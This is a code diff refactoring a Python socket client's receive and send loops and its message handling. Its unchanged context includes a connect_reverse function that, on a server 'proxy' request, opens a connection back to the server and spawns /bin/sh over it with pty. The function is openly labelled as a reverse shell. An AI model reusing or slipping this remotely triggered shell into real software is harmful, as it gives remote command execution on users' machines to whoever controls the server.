@@ -3,7 +3,6 @@ import errno
 import sys
 import os
 import pty
-import json
 from threading import Thread
 
 from communication import *
@@ -12,10 +11,11 @@ def connect_reverse(host: str, port: int) -> None:
     """Creates reverse shell connection with the server
 
     Args:
+        host: Hostname of the server
         port: At which port to connect to the server
     """
     print(f'Connecting to proxy at {port}')
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
 
     # open shell
@@ -24,28 +24,27 @@ def connect_reverse(host: str, port: int) -> None:
     os.dup2(s.fileno(),2)
     pty.spawn("/bin/sh")
 
-def recv_from_server(client: Client) -> None:
+def recv_loop(client: Client) -> None:
     """Receive packets from the server
 
     Args:
         client: Receiving client
+
+    Throws:
+        IOError: There is no upcoming data
     """
-    server = client.socket
     while True:
         try:
             # loop over all received messages
             while True:
-                message_header: bytes = server.recv(HEADER_LENGTH)
-                
-                if not message_header:
+                message: Optional[dict] = client.receive()
+                if message is None:
                     # server closed
                     print('Connection closed by the server')
                     sys.exit()
-                    
-                message_length: int = int(decode_json(message_header))
-                message: dict = json.loads(server.recv(message_length).decode('utf-8'))
-                client_response = client.handle_request(message)
+                assert message is not None
 
+                client_response = client.handle_request(message)
                 if client_response:
                     client.send(client_response)
                 print('\r', message, end=f'\n{client.name} > ')
@@ -55,23 +54,19 @@ def recv_from_server(client: Client) -> None:
                     if message['request'] == 'proxy':
                         print('received proxy request')
                         t = Thread(target=connect_reverse,
-                                   args=(server.getsockname()[0], message['port']))
+                                   args=(client.get_server_addr()[0], message['port']))
                         t.start()
 
         except IOError as e:
-            # when there are no incoming data error is going to be raised
             if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
                 print('Reading error: {}'.format(str(e)))
                 sys.exit()
 
-            # we did not receive anything
-            continue
-
         except Exception as e:
-            print('Reading error: '.format(str(e)))
+            print('Reading error: ', e)
             sys.exit()
 
-def send_to_server(server: socket.socket) -> None:
+def send_loop(client: Client) -> None:
     """Send messages to the server
 
     Args:
@@ -81,7 +76,7 @@ def send_to_server(server: socket.socket) -> None:
         message = input(f'{client.name} > ')
 
         if message:
-            server.send(encode_json(message))
+            client.send(message)
 
 if __name__ == '__main__':
     import argparse
@@ -103,11 +98,12 @@ if __name__ == '__main__':
     client_socket.connect((args.hostname, args.port))
 
     # send registration
-    client: Client = create_client(args.client_type, args.name, client_socket)
+    client: Optional[Client] = create_client(args.client_type, args.name, client_socket)
+    assert client is not None
     if isinstance(client, Device):
         client.metadata_file = args.file
-    client_socket.send(client.registration_packet(args.client_type, args.name))
+    client.send(client.registration_packet(args.client_type, args.name))
 
-    t = Thread(target=recv_from_server, args=(client,))
+    t = Thread(target=recv_loop, args=(client,))
     t.start()
-    send_to_server(client_socket)
+    send_loop(client)
